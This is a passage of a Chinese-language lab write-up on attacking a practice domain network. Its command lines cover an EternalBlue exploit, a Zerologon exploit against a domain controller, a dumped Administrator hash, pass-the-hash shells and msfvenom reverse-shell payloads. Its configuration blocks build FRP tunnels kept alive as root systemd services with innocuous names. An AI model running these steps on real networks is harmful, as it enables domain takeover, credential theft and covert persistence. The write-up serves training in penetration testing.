+<h3 id="_18">内网信息收集<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
+<p><strong>网段探测</strong>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-08-00-08.png" />
+存在192.168.93.0/24网段</p>
+<p><strong>存活主机探测</strong>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-07-59-11.png" />
+存在PC2和DC两台内网主机</p>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-08-01-46.png" />
+DC的IP为192.168.93.30
+PC2的IP为192.168.93.40</p>
+<p><strong>net user /domain</strong>查看域用户
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-11-39-34.png" /></p>
+<h3 id="pc2">PC2<a class="headerlink" href="#pc2" title="Permanent link">&para;</a></h3>
+<h4 id="_19">漏洞探测<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h4>
+<p><strong>端口扫描</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>nmap -sS -Pn --min-rate 1000 -p- 192.168.93.40
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-48-31.png" /></p>
+<p>445端口开放，可能存在永恒之蓝
+使用msf框架探测
+在 Kali 终端启动 msfconsole
+<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>search ms17_010      #查找相关模块
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-01-25-54.png" /></p>
+<p>选择利用的模块路径并配置好参数
+<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>use auxiliary/scanner/smb/smb_ms17_010    
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>set RHOSTS 192.168.93.40
+</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>run
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-49-44.png" />
+发现确实存在永恒之蓝漏洞可以利用</p>
+<h4 id="_20">漏洞利用<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>MS17-010永恒之蓝拿下PC1的shell
+在 Kali 终端启动 msfconsole
+<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>use exploit/windows/smb/ms17_010_eternalblue
+</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>set RHOSTS 192.168.93.40
+</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>set Proxies socks5:127.0.0.1:12345
+</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>set payload windows/x64/meterpreter/bind_tcp    # 内网机器回连不到 Kali，必须用 bind_tcp
+</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a>set LPORT 4447
+</span><span id="__span-62-6"><a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a>run
+</span></code></pre></div></p>
+</blockquote>
+<p><img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-01-57-58.png" />
+利用成功，获取一个会话
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-01-59-05.png" />
+system权限不需要提权</p>
+<h3 id="dc">DC<a class="headerlink" href="#dc" title="Permanent link">&para;</a></h3>
+<h4 id="_21">漏洞探测<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h4>
+<ul>
+<li>
+<p><strong>端口扫描</strong>
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>nmap -sS -Pn --min-rate 1000 -p- 192.168.93.30
+</span></code></pre></div>
+   <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-20-45-24.png" /></p>
+</li>
+<li>
+<p><strong>利用脚本验证是否存在zerologon（CVE-2020-1472）漏洞</strong></p>
+</li>
+</ul>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a> python3 zerologon_tester.py DC 192.168.93.30
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-20-58-51.png" />
+  存在该漏洞</p>
+<h4 id="_22">漏洞利用<a class="headerlink" href="#_22" title="Permanent link">&para;</a></h4>
+<ul>
+<li>
+<p><strong>清空域控机器账户密码</strong>
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>python3 cve-2020-1472-exploit.py DC 192.168.93.30
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-21-01-14.png" />
+  执行成功，DC01$ 的密码即为空。</p>
+</li>
+<li>
+<p><strong>DCSync 导出域管哈希</strong>
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>impacket-secretsdump -no-pass -just-dc WHOAMIANONY/DC\$@192.168.93.30 
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-01-17-18.png" /></p>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>Administrator:500:aad3b435b51404eeaad3b435b51404ee:ab89b1295e69d353dd7614c7a3a80cec:::
+</span></code></pre></div>
+<ul>
+<li><strong>WMI利用</strong></li>
+</ul>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>impacket-wmiexec whoamianony.org/Administrator\@192.168.93.30 -hashes :ab89b1295e69d353dd7614c7a3a80cec   
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-01-30-42.png" />
+  成功获取DC机器的shell
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-01-31-39.png" />
+  administrator权限</p>
+<h2 id="msf_1">msf上线<a class="headerlink" href="#msf_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p><strong>web1上线msf</strong>
+  生成木马文件
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.162.128 LPORT=4444 -f elf -o web1_shell.elf
+</span></code></pre></div>
+  msf上监听4444端口等待web1连接
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>msfconsole
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>use exploit/multi/handler
+</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>set payload linux/x86/meterpreter/reverse_tcp
+</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>set LHOST 192.168.162.128
+</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a>set LPORT 4444
+</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a>run
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-01-55-02.png" />
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-01-56-50.png" /></p>
+</li>
+<li>
+<p><strong>添加通往52网段的路由</strong></p>
+</li>
+</ul>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>run autoroute -s 192.168.52.0/24
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-10-23.png" />
+  让 MSF 开启一个 SOCKS 代理
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>meterpreter &gt; background  # 把 session 1 放到后台
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>use auxiliary/server/socks_proxy
+</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a>set SRVPORT 1080
+</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a>run -j
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-11-03.png" /></p>
+<ul>
+<li><strong>web2</strong>
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=192.168.52.20 LPORT=6666 -f elf -o web2_bind.elf
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-35-48.png" />
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>use exploit/multi/handler
+</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>set payload linux/x86/meterpreter/reverse_tcp
+</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3" href="#__codelineno-74-3"></a>set LHOST 192.168.162.128
+</span><span id="__span-74-4"><a id="__codelineno-74-4" name="__codelineno-74-4" href="#__codelineno-74-4"></a>set LPORT 6666
+</span><span id="__span-74-5"><a id="__codelineno-74-5" name="__codelineno-74-5" href="#__codelineno-74-5"></a>run
+</span></code></pre></div>
+  web2下载并运行木马
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-45-10.png" />
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-44-33.png" />
+  上线成功</li>
+<li><strong>添加通往93网段的路由</strong>
+  <div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>run autoroute -s 192.168.93.0/24
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-48-19.png" />
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-49-04.png" /></li>
+<li><strong>pc1</strong>
+  pc1是通过msf木马获取shell的也已经在msf中上线了
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-06-22-57.png" /></li>
+<li><strong>PC2</strong>
+  PC2本来就是通过msf利用永恒之蓝拿下的，已经上线msf了
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-55-11.png" /></li>
+</ul>
+<h2 id="_23">持久化<a class="headerlink" href="#_23" title="Permanent link">&para;</a></h2>
+<h3 id="frp">隧道持久化——级联 FRP<a class="headerlink" href="#frp" title="Permanent link">&para;</a></h3>
+<p><strong>持久化结构图</strong></p>
+<blockquote>
+<p>Kali:9051 -&gt; Web1:9052 -&gt; Web1:7001 -&gt; Web2:frpc -&gt; Web2 (93网段网卡) -&gt; 最终目标</p>
+</blockquote>
+<ul>
+<li>
+<p>kali侧：启动 frps 服务端
+  <div class="language-toml highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="n">bindPort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">7000</span><span class="w">    </span>
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-14-48-24.png" />
+  <div class="language-bash highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>./frps<span class="w"> </span>-c<span class="w"> </span>frps.toml
+</span></code></pre></div>
+  <img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-14-48-44.png" />
+  Kali 会监听 7000 端口，等待 Web1 来连接</p>
+</li>
+<li>
+<p>修改 Kali 的 /etc/proxychains4.conf，此时 Kali 本地会拥有两个代理端口：9050 对应 52 网段，9051 对应 93 网段。根据目标切换即可
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>[ProxyList]
+</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a># 访问 52 网段时用这个：
+</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3" href="#__codelineno-78-3"></a>socks5 127.0.0.1 9050
+</span><span id="__span-78-4"><a id="__codelineno-78-4" name="__codelineno-78-4" href="#__codelineno-78-4"></a># 访问 93 网段时换成这个（记得注释掉上面那行）：
+</span><span id="__span-78-5"><a id="__codelineno-78-5" name="__codelineno-78-5" href="#__codelineno-78-5"></a># socks5 127.0.0.1 9051
+</span></code></pre></div></p>
+</li>
+<li>
+<p>Web1 侧配置
+  核心中转站——Web1 现在要身兼两职：既是 Kali 的客户端（frpc），又是 Web2 的服务端（frps）</p>
+</li>
+<li>
+<p>web1配置并启动 frpc 客户端
+    <div class="language-toml highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a><span class="c1"># 客户端连接服务端的配置</span>
+</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a><span class="n">serverAddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;192.168.162.128&quot;</span>
+</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3" href="#__codelineno-79-3"></a><span class="n">serverPort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">7000</span>
+</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4" href="#__codelineno-79-4"></a>
+</span><span id="__span-79-5"><a id="__codelineno-79-5" name="__codelineno-79-5" href="#__codelineno-79-5"></a><span class="c1"># --- 52 网段代理 ---</span>
+</span><span id="__span-79-6"><a id="__codelineno-79-6" name="__codelineno-79-6" href="#__codelineno-79-6"></a><span class="k">[[proxies]]</span>
+</span><span id="__span-79-7"><a id="__codelineno-79-7" name="__codelineno-79-7" href="#__codelineno-79-7"></a><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;socks5_proxy_52&quot;</span>
+</span><span id="__span-79-8"><a id="__codelineno-79-8" name="__codelineno-79-8" href="#__codelineno-79-8"></a><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;tcp&quot;</span>
+</span><span id="__span-79-9"><a id="__codelineno-79-9" name="__codelineno-79-9" href="#__codelineno-79-9"></a><span class="n">remotePort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">9050</span>
+</span><span id="__span-79-10"><a id="__codelineno-79-10" name="__codelineno-79-10" href="#__codelineno-79-10"></a><span class="k">[proxies.plugin]</span>
+</span><span id="__span-79-11"><a id="__codelineno-79-11" name="__codelineno-79-11" href="#__codelineno-79-11"></a><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;socks5&quot;</span>
+</span><span id="__span-79-12"><a id="__codelineno-79-12" name="__codelineno-79-12" href="#__codelineno-79-12"></a>
+</span><span id="__span-79-13"><a id="__codelineno-79-13" name="__codelineno-79-13" href="#__codelineno-79-13"></a><span class="c1"># --- 把 Web1 的 9052 端口（Web2代理端口）暴露给 Kali 的 9051 ---</span>
+</span><span id="__span-79-14"><a id="__codelineno-79-14" name="__codelineno-79-14" href="#__codelineno-79-14"></a><span class="k">[[proxies]]</span>
+</span><span id="__span-79-15"><a id="__codelineno-79-15" name="__codelineno-79-15" href="#__codelineno-79-15"></a><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;web2_proxy_forward&quot;</span>
+</span><span id="__span-79-16"><a id="__codelineno-79-16" name="__codelineno-79-16" href="#__codelineno-79-16"></a><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;tcp&quot;</span>
+</span><span id="__span-79-17"><a id="__codelineno-79-17" name="__codelineno-79-17" href="#__codelineno-79-17"></a><span class="n">localIP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;127.0.0.1&quot;</span>
+</span><span id="__span-79-18"><a id="__codelineno-79-18" name="__codelineno-79-18" href="#__codelineno-79-18"></a><span class="n">localPort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">9052</span>
+</span><span id="__span-79-19"><a id="__codelineno-79-19" name="__codelineno-79-19" href="#__codelineno-79-19"></a><span class="n">remotePort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">9051</span>
+</span><span id="__span-79-20"><a id="__codelineno-79-20" name="__codelineno-79-20" href="#__codelineno-79-20"></a>
+</span><span id="__span-79-21"><a id="__codelineno-79-21" name="__codelineno-79-21" href="#__codelineno-79-21"></a><span class="c1"># 接力 Web2 发来的反向 Shell 流量 ---</span>
+</span><span id="__span-79-22"><a id="__codelineno-79-22" name="__codelineno-79-22" href="#__codelineno-79-22"></a><span class="k">[[proxies]]</span>
+</span><span id="__span-79-23"><a id="__codelineno-79-23" name="__codelineno-79-23" href="#__codelineno-79-23"></a><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;web1_relay_4444&quot;</span>
+</span><span id="__span-79-24"><a id="__codelineno-79-24" name="__codelineno-79-24" href="#__codelineno-79-24"></a><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;tcp&quot;</span>
+</span><span id="__span-79-25"><a id="__codelineno-79-25" name="__codelineno-79-25" href="#__codelineno-79-25"></a><span class="n">localIP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;127.0.0.1&quot;</span>
+</span><span id="__span-79-26"><a id="__codelineno-79-26" name="__codelineno-79-26" href="#__codelineno-79-26"></a><span class="n">localPort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;4444&quot;</span><span class="w">    </span><span class="c1"># 接收 Web2 刚刚映射到本地的 4444 端口</span>
+</span><span id="__span-79-27"><a id="__codelineno-79-27" name="__codelineno-79-27" href="#__codelineno-79-27"></a><span class="n">remotePort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;4444&quot;</span><span class="w">   </span><span class="c1"># 最终映射到 Kali 的 4444 端口</span>
+</span><span id="__span-79-28"><a id="__codelineno-79-28" name="__codelineno-79-28" href="#__codelineno-79-28"></a>
+</span><span id="__span-79-29"><a id="__codelineno-79-29" name="__codelineno-79-29" href="#__codelineno-79-29"></a><span class="k">[[proxies]]</span>
+</span><span id="__span-79-30"><a id="__codelineno-79-30" name="__codelineno-79-30" href="#__codelineno-79-30"></a><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;web1_relay_4445&quot;</span>
+</span><span id="__span-79-31"><a id="__codelineno-79-31" name="__codelineno-79-31" href="#__codelineno-79-31"></a><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;tcp&quot;</span>
+</span><span id="__span-79-32"><a id="__codelineno-79-32" name="__codelineno-79-32" href="#__codelineno-79-32"></a><span class="n">localIP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;127.0.0.1&quot;</span>
+</span><span id="__span-79-33"><a id="__codelineno-79-33" name="__codelineno-79-33" href="#__codelineno-79-33"></a><span class="n">localPort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;4445&quot;</span><span class="w">    </span><span class="c1"># 接收 Web2 刚刚映射到本地的 4445 端口</span>
+</span><span id="__span-79-34"><a id="__codelineno-79-34" name="__codelineno-79-34" href="#__codelineno-79-34"></a><span class="n">remotePort</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;4445&quot;</span><span class="w">   </span><span class="c1"># 最终映射到 Kali 的 4445 端口</span>
+</span></code></pre></div></p>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>./frpc<span class="w"> </span>-c<span class="w"> </span>frpc.toml
+</span></code></pre></div>
+  - 把frpc启动命令写入systemd服务实现开机自启动
+/etc/systemd/system/frp-forward.service 
+<div class="language-text highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>[Unit]
+</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a>Description=Network Forwarding (frp-tunnel) Service
+</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3" href="#__codelineno-81-3"></a>After=network-online.target
+</span><span id="__span-81-4"><a id="__codelineno-81-4" name="__codelineno-81-4" href="#__codelineno-81-4"></a>Wants=network-online.target
+</span><span id="__span-81-5"><a id="__codelineno-81-5" name="__codelineno-81-5" href="#__codelineno-81-5"></a>
+</span><span id="__span-81-6"><a id="__codelineno-81-6" name="__codelineno-81-6" href="#__codelineno-81-6"></a>
+</span><span id="__span-81-7"><a id="__codelineno-81-7" name="__codelineno-81-7" href="#__codelineno-81-7"></a>[Service]
+</span><span id="__span-81-8"><a id="__codelineno-81-8" name="__codelineno-81-8" href="#__codelineno-81-8"></a>Type=simple
+</span><span id="__span-81-9"><a id="__codelineno-81-9" name="__codelineno-81-9" href="#__codelineno-81-9"></a>ExecStart=/frpc -c /frpc.toml
+</span><span id="__span-81-10"><a id="__codelineno-81-10" name="__codelineno-81-10" href="#__codelineno-81-10"></a>Restart=always
+</span><span id="__span-81-11"><a id="__codelineno-81-11" name="__codelineno-81-11" href="#__codelineno-81-11"></a>RestartSec=10
+</span><span id="__span-81-12"><a id="__codelineno-81-12" name="__codelineno-81-12" href="#__codelineno-81-12"></a>User=root
+</span><span id="__span-81-13"><a id="__codelineno-81-13" name="__codelineno-81-13" href="#__codelineno-81-13"></a>
+</span><span id="__span-81-14"><a id="__codelineno-81-14" name="__codelineno-81-14" href="#__codelineno-81-14"></a>[Install]
+</span><span id="__span-81-15"><a id="__codelineno-81-15" name="__codelineno-81-15" href="#__codelineno-81-15"></a>WantedBy=multi-user.target    
+</span></code></pre></div></p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>systemctl enable frp-forward.service 
+</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a>systemctl start frp-forward.service 
+</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a>systemctl status frp-forward.service 
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-17-29-25.png" />
+  - Web1 配置 frps 服务端
+<div class="language-text highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>bindPort = 7001
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-17-24-25.png" />
+启动命令
+<div class="language-text highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>frps -c frps.toml
+</span></code></pre></div>
+配置成systemd服务
+/etc/systemd/system/frp-server.service 
+<div class="language-text highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>[Unit]
+</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a>Description=Network Forwarding (frp-server) Service
+</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#__codelineno-85-3"></a>After=network-online.target
+</span><span id="__span-85-4"><a id="__codelineno-85-4" name="__codelineno-85-4" href="#__codelineno-85-4"></a>Wants=network-online.target
+</span><span id="__span-85-5"><a id="__codelineno-85-5" name="__codelineno-85-5" href="#__codelineno-85-5"></a>
+</span><span id="__span-85-6"><a id="__codelineno-85-6" name="__codelineno-85-6" href="#__codelineno-85-6"></a>
+</span><span id="__span-85-7"><a id="__codelineno-85-7" name="__codelineno-85-7" href="#__codelineno-85-7"></a>[Service]
+</span><span id="__span-85-8"><a id="__codelineno-85-8" name="__codelineno-85-8" href="#__codelineno-85-8"></a>Type=simple
+</span><span id="__span-85-9"><a id="__codelineno-85-9" name="__codelineno-85-9" href="#__codelineno-85-9"></a>ExecStart=/frps -c /frps.toml
+</span><span id="__span-85-10"><a id="__codelineno-85-10" name="__codelineno-85-10" href="#__codelineno-85-10"></a>Restart=always
+</span><span id="__span-85-11"><a id="__codelineno-85-11" name="__codelineno-85-11" href="#__codelineno-85-11"></a>RestartSec=10
+</span><span id="__span-85-12"><a id="__codelineno-85-12" name="__codelineno-85-12" href="#__codelineno-85-12"></a>User=root
+</span><span id="__span-85-13"><a id="__codelineno-85-13" name="__codelineno-85-13" href="#__codelineno-85-13"></a>
+</span><span id="__span-85-14"><a id="__codelineno-85-14" name="__codelineno-85-14" href="#__codelineno-85-14"></a>[Install]
+</span><span id="__span-85-15"><a id="__codelineno-85-15" name="__codelineno-85-15" href="#__codelineno-85-15"></a>WantedBy=multi-user.target    
+</span></code></pre></div>
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-17-25-23.png" /></p>
+</li>
+<li>
+<p>把frps启动命令写入systemd服务实现开机自启动
+    /etc/systemd/system/frp-server.service 
+    <div class="language-text highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>[Unit]
+</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a>Description=Network Forwarding (frp-server) Service
+</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3" href="#__codelineno-86-3"></a>After=network-online.target
+</span><span id="__span-86-4"><a id="__codelineno-86-4" name="__codelineno-86-4" href="#__codelineno-86-4"></a>Wants=network-online.target
+</span><span id="__span-86-5"><a id="__codelineno-86-5" name="__codelineno-86-5" href="#__codelineno-86-5"></a>
+</span><span id="__span-86-6"><a id="__codelineno-86-6" name="__codelineno-86-6" href="#__codelineno-86-6"></a>
+</span><span id="__span-86-7"><a id="__codelineno-86-7" name="__codelineno-86-7" href="#__codelineno-86-7"></a>[Service]
+</span><span id="__span-86-8"><a id="__codelineno-86-8" name="__codelineno-86-8" href="#__codelineno-86-8"></a>Type=simple
+</span><span id="__span-86-9"><a id="__codelineno-86-9" name="__codelineno-86-9" href="#__codelineno-86-9"></a>ExecStart=/frps -c /frps.toml
+</span><span id="__span-86-10"><a id="__codelineno-86-10" name="__codelineno-86-10" href="#__codelineno-86-10"></a>Restart=always
+</span><span id="__span-86-11"><a id="__codelineno-86-11" name="__codelineno-86-11" href="#__codelineno-86-11"></a>RestartSec=10
+</span><span id="__span-86-12"><a id="__codelineno-86-12" name="__codelineno-86-12" href="#__codelineno-86-12"></a>User=root
+</span><span id="__span-86-13"><a id="__codelineno-86-13" name="__codelineno-86-13" href="#__codelineno-86-13"></a>
+</span><span id="__span-86-14"><a id="__codelineno-86-14" name="__codelineno-86-14" href="#__codelineno-86-14"></a>[Install]
+</span><span id="__span-86-15"><a id="__codelineno-86-15" name="__codelineno-86-15" href="#__codelineno-86-15"></a>WantedBy=multi-user.target    
+</span></code></pre></div></p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>systemctl enable frp-server.service 
+</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a>systemctl start frp-server.service 
+</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3" href="#__codelineno-87-3"></a>systemctl status frp-server.service 
+</span></code></pre></div>
